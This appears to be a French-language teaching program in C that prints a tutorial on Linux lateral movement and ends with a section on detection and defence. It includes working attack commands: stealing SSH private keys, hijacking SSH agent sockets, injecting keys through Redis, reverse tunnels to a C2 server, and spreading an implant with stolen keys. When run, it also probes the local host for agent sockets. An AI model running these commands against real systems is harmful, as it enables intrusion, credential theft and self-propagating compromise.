/*
 * OBJECTIF  : Comprendre le mouvement lateral sur Linux
 * PREREQUIS : Bases C, SSH, services reseau, sockets
 * COMPILE   : gcc -o example example.c
 *
 * Ce programme demontre les techniques de mouvement lateral
 * sur Linux : SSH, exploitation de services, pass-the-key,
 * decouverte reseau, et pivoting. Demonstration pedagogique.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <sys/stat.h>

/*
 * Etape 1 : Techniques de mouvement lateral
 */
static void explain_lateral_movement(void) {
    printf("[*] Etape 1 : Techniques de mouvement lateral Linux\n\n");

    printf("    ┌──────────┐  SSH/Keys   ┌──────────┐\n");
    printf("    │ Machine  │────────────>│ Machine  │\n");
    printf("    │ Compromise│             │ Cible    │\n");
    printf("    │          │<────────────│          │\n");
    printf("    └──────────┘  Reverse    └──────────┘\n\n");

    printf("    Techniques principales :\n");
    printf("    ───────────────────────────────────\n");
    printf("    Technique       | Prerequis        | Furtivite\n");
    printf("    ────────────────|──────────────────|──────────\n");
    printf("    SSH + cle volee | Cle privee       | Moyen\n");
    printf("    SSH + password  | Password         | Faible\n");
    printf("    SSH agent fwd   | Agent forwarding | Eleve\n");
    printf("    SSH ProxyJump   | Config SSH       | Moyen\n");
    printf("    NFS share       | Montage NFS      | Moyen\n");
    printf("    Cron/Ansible    | Acces au master  | Eleve\n");
    printf("    RCE service     | Vuln service     | Variable\n");
    printf("    rsync/scp       | Creds SSH        | Faible\n\n");
}

/*
 * Etape 2 : Decouverte reseau
 */
static void demo_network_discovery(void) {
    printf("[*] Etape 2 : Decouverte reseau depuis la machine compromise\n\n");

    printf("    Commandes de decouverte :\n");
    printf("    ───────────────────────────────────\n");
    printf("    # Interfaces reseau\n");
    printf("    ip addr show\n\n");
    printf("    # Table ARP (machines connues)\n");
    printf("    ip neigh show  # ou arp -a\n\n");
    printf("    # Routes (subnets accessibles)\n");
    printf("    ip route show\n\n");
    printf("    # Connexions actives (services cibles)\n");
    printf("    ss -tnp\n\n");
    printf("    # DNS interne (trouver des services)\n");
    printf("    cat /etc/resolv.conf\n\n");

    /* Demo : lister les interfaces */
    printf("    Interfaces reseau actuelles :\n");
    FILE *fp = popen("ip -brief addr 2>/dev/null || ifconfig 2>/dev/null", "r");
    if (fp) {
        char line[256];
        int count = 0;
        while (fgets(line, sizeof(line), fp) && count < 8) {
            line[strcspn(line, "\n")] = '\0';
            if (strlen(line) > 0)
                printf("      %s\n", line);
            count++;
        }
        pclose(fp);
    }
    printf("\n");

    /* Scanner de ports basique */
    printf("    Scan de ports basique en C :\n");
    printf("    ───────────────────────────────────\n");
    printf("    int scan_port(const char *ip, int port) {\n");
    printf("        int sock = socket(AF_INET, SOCK_STREAM, 0);\n");
    printf("        struct sockaddr_in sa = {\n");
    printf("            .sin_family = AF_INET,\n");
    printf("            .sin_port = htons(port),\n");
    printf("        };\n");
    printf("        inet_pton(AF_INET, ip, &sa.sin_addr);\n\n");
    printf("        // Timeout court pour le scan\n");
    printf("        struct timeval tv = {.tv_sec = 1};\n");
    printf("        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO,\n");
    printf("                   &tv, sizeof(tv));\n\n");
    printf("        int ret = connect(sock, (void *)&sa, sizeof(sa));\n");
    printf("        close(sock);\n");
    printf("        return (ret == 0);  // 1 = ouvert\n");
    printf("    }\n\n");
}

/*
 * Etape 3 : Mouvement lateral via SSH
 */
static void explain_ssh_lateral(void) {
    printf("[*] Etape 3 : Mouvement lateral via SSH\n\n");

    printf("    Methode 1 : Cle privee volee\n");
    printf("    ───────────────────────────────────\n");
    printf("    // Copier la cle privee de la victime\n");
    printf("    cat ~/.ssh/id_rsa > /tmp/.k\n");
    printf("    chmod 600 /tmp/.k\n");
    printf("    ssh -i /tmp/.k user@target\n\n");

    printf("    Methode 2 : SSH Agent forwarding hijack\n");
    printf("    ───────────────────────────────────\n");
    printf("    // Si l'admin utilise ssh -A (agent forwarding)\n");
    printf("    // Son socket agent est accessible :\n");
    printf("    // /tmp/ssh-XXXX/agent.PID\n");
    printf("    export SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.PID\n");
    printf("    ssh-add -l  // Lister les cles de l'admin\n");
    printf("    ssh target   // Se connecter avec sa cle !\n\n");

    /* Chercher les sockets SSH agent */
    printf("    Recherche de SSH agent sockets :\n");
    char *auth_sock = getenv("SSH_AUTH_SOCK");
    if (auth_sock)
        printf("      SSH_AUTH_SOCK = %s\n", auth_sock);
    else
        printf("      SSH_AUTH_SOCK non defini\n");

    FILE *fp = popen("ls /tmp/ssh-*/agent.* 2>/dev/null", "r");
    if (fp) {
        char line[256];
        int found = 0;
        while (fgets(line, sizeof(line), fp)) {
            line[strcspn(line, "\n")] = '\0';
            printf("      [!] Agent socket : %s\n", line);
            found = 1;
        }
        pclose(fp);
        if (!found) printf("      (aucun agent socket trouve)\n");
    }
    printf("\n");

    printf("    Methode 3 : SSH ProxyJump (pivot)\n");
    printf("    ───────────────────────────────────\n");
    printf("    ssh -J compromised@pivot target@internal\n");
    printf("    // Ou dans ~/.ssh/config :\n");
    printf("    // Host internal\n");
    printf("    //     ProxyJump pivot\n\n");
}

/*
 * Etape 4 : Exploitation de services
 */
static void explain_service_exploitation(void) {
    printf("[*] Etape 4 : Exploitation de services pour le lateral\n\n");

    printf("    Services courants exploitables :\n");
    printf("    ───────────────────────────────────\n");
    printf("    Service    | Port  | Attaque\n");
    printf("    ───────────|───────|─────────────────────────\n");
    printf("    SSH        | 22    | Bruteforce, cle volee\n");
    printf("    NFS        | 2049  | Montage sans auth\n");
    printf("    Redis      | 6379  | Commande CONFIG SET\n");
    printf("    PostgreSQL | 5432  | Creds par defaut, RCE\n");
    printf("    MySQL      | 3306  | UDF, INTO OUTFILE\n");
    printf("    Docker API | 2375  | Execution de containers\n");
    printf("    Ansible    | -     | Playbook malveillant\n");
    printf("    Jenkins    | 8080  | Script console\n");
    printf("    GitLab     | 80    | CI/CD pipeline\n\n");

    printf("    Exemple : Redis -> SSH (cle autorisee)\n");
    printf("    ───────────────────────────────────\n");
    printf("    // Generer une cle SSH\n");
    printf("    ssh-keygen -t ed25519 -f /tmp/k -N ''\n\n");
    printf("    // L'injecter via Redis\n");
    printf("    redis-cli -h target CONFIG SET dir /root/.ssh/\n");
    printf("    redis-cli -h target CONFIG SET dbfilename authorized_keys\n");
    printf("    redis-cli -h target SET x \"$(cat /tmp/k.pub)\"\n");
    printf("    redis-cli -h target BGSAVE\n\n");
    printf("    // Se connecter\n");
    printf("    ssh -i /tmp/k root@target\n\n");
}

/*
 * Etape 5 : Tunneling et pivoting
 */
static void explain_pivoting(void) {
    printf("[*] Etape 5 : Tunneling et pivoting\n\n");

    printf("    ┌──────┐    ┌──────────┐    ┌──────────┐\n");
    printf("    │ C2   │───>│ Pivot    │───>│ Internal │\n");
    printf("    │ Srv  │    │ (DMZ)    │    │ Network  │\n");
    printf("    └──────┘    └──────────┘    └──────────┘\n");
    printf("                  Tunnel SSH\n\n");

    printf("    Technique 1 : SSH Local Port Forward\n");
    printf("    ───────────────────────────────────\n");
    printf("    ssh -L 8080:internal:80 user@pivot\n");
    printf("    // localhost:8080 -> pivot -> internal:80\n\n");

    printf("    Technique 2 : SSH Dynamic SOCKS Proxy\n");
    printf("    ───────────────────────────────────\n");
    printf("    ssh -D 1080 user@pivot\n");
    printf("    // Proxy SOCKS5 sur localhost:1080\n");
    printf("    proxychains nmap -sT internal/24\n\n");

    printf("    Technique 3 : SSH Remote Port Forward\n");
    printf("    ───────────────────────────────────\n");
    printf("    ssh -R 4444:localhost:22 user@c2\n");
    printf("    // Sur le C2 : ssh -p 4444 localhost\n");
    printf("    // -> Connexion inverse vers la machine compromise\n\n");

    printf("    Technique 4 : Chisel (HTTP tunnel)\n");
    printf("    ───────────────────────────────────\n");
    printf("    // Serveur (C2)\n");
    printf("    chisel server -p 8080 --reverse\n");
    printf("    // Client (pivot)\n");
    printf("    chisel client c2:8080 R:socks\n\n");

    printf("    Technique 5 : socat relay\n");
    printf("    ───────────────────────────────────\n");
    printf("    socat TCP-LISTEN:8888,fork TCP:internal:22\n");
    printf("    // Relay le port 8888 vers internal:22\n\n");
}

/*
 * Etape 6 : Mouvement lateral automatise
 */
static void explain_automated_lateral(void) {
    printf("[*] Etape 6 : Mouvement lateral automatise\n\n");

    printf("    Algorithme d'un implant :\n");
    printf("    ───────────────────────────────────\n");
    printf("    1. Collecter les credentials locaux\n");
    printf("       - Cles SSH, passwords, tokens\n\n");
    printf("    2. Decouvrir le reseau\n");
    printf("       - ARP table, /etc/hosts, DNS\n");
    printf("       - Scanner les ports SSH (22)\n\n");
    printf("    3. Pour chaque cible accessible :\n");
    printf("       a. Essayer les cles SSH volees\n");
    printf("       b. Essayer les passwords extraits\n");
    printf("       c. Verifier les services vulnerables\n\n");
    printf("    4. Sur chaque nouvelle machine :\n");
    printf("       a. Deployer l'implant\n");
    printf("       b. Collecter les credentials\n");
    printf("       c. Recommencer le scan\n\n");

    printf("    Code de deploiement de l'implant :\n");
    printf("    ───────────────────────────────────\n");
    printf("    // Via SCP\n");
    printf("    scp -i stolen_key implant user@target:/tmp/.u\n");
    printf("    ssh -i stolen_key user@target '/tmp/.u &'\n\n");
    printf("    // Via SSH et base64\n");
    printf("    cat implant | base64 | \\\n");
    printf("    ssh user@target 'base64 -d > /tmp/.u && chmod +x /tmp/.u && /tmp/.u &'\n\n");
}

/*
 * Etape 7 : Detection et protection
 */
static void explain_detection(void) {
    printf("[*] Etape 7 : Detection et protection\n\n");

    printf("    Detecter le mouvement lateral :\n");
    printf("    ───────────────────────────────────\n");
    printf("    1. Connexions SSH inhabituelles\n");
    printf("       -> Logs : /var/log/auth.log, journalctl\n");
    printf("       -> Horaires, source IP, username\n\n");
    printf("    2. Utilisation de cles SSH inconnues\n");
    printf("       -> authorized_keys modifie\n\n");
    printf("    3. SSH agent forwarding\n");
    printf("       -> Desactiver si non necessaire\n\n");
    printf("    4. Scan de ports interne\n");
    printf("       -> IDS/IPS, monitoring reseau\n\n");
    printf("    5. Transferts de fichiers suspects\n");
    printf("       -> scp/rsync depuis des sources inconnues\n\n");

    printf("    Protections :\n");
    printf("    ───────────────────────────────────\n");
    printf("    - MFA pour SSH (pam_google_authenticator)\n");
    printf("    - Desactiver SSH agent forwarding\n");
    printf("    - Segmentation reseau (VLANs, firewalls)\n");
    printf("    - Zero Trust : authentification par session\n");
    printf("    - Certificate-based SSH (short-lived certs)\n");
    printf("    - Monitorer les connexions SSH (auditd)\n");
    printf("    - Restreindre les acces NFS, Redis, etc.\n");
    printf("    - Bastion hosts / jump servers\n\n");
}

int main(void) {
    printf("[*] Demo : Lateral Movement Linux\n\n");

    explain_lateral_movement();
    demo_network_discovery();
    explain_ssh_lateral();
    explain_service_exploitation();
    explain_pivoting();
    explain_automated_lateral();
    explain_detection();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
